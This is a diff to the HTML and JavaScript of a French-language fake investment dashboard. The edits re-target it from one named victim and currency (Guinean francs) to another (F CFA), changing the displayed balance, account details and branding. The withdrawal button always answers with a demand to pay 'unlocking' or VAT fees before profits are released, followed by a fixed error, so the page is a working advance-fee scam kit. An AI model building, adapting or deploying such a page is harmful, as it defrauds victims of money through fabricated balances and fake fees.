@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "622904170") {
+        if (code === "71975235") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -241,14 +241,14 @@
 
     <header>
         <div class="logo">
-            <h1>GLOBAL INVESTISSEMENT</h1>
+            <h1>BMI INVESTISSEMENT</h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 8 300 000 GNF</span>
+                <span class="balance">Solde: 12 000 000 F CFA</span>
                 <div class="account-info">
-                    <span id="user-name">MAMADOU OURY</span><br>
-                    <span id="user-phone">+224 622 90 41 70</span>
+                    <span id="user-name">DAYO ACHILLE</span><br>
+                    <span id="user-phone"> BF4326074080011985440120125 </span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +277,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Orange Money</button>
+                <button id="orange-money">Retirer via FADA N'GOURMA</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -310,9 +310,9 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "MAMADOU OURY";
-                const accountNumber = "224 622 90 41 70";
-                const balance = "8 300 000 GNF";
+                const accountName = "DAYO ACHILLE";
+                const accountNumber = "BF4326074080011985440120125";
+                const balance = "12 000 000 F CFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
@@ -332,10 +332,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher MAMADOU, veuillez les frais de déblocage de 2 500 000 GNF afin de recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher DAYO, veuillez payer les frais de TVA afin de recevoir vos bénéfices immediatement.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : Frais de déblocage néccéssaire.';
+                errorMessage.textContent = 'Erreur : Frais de tva néccéssaire.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
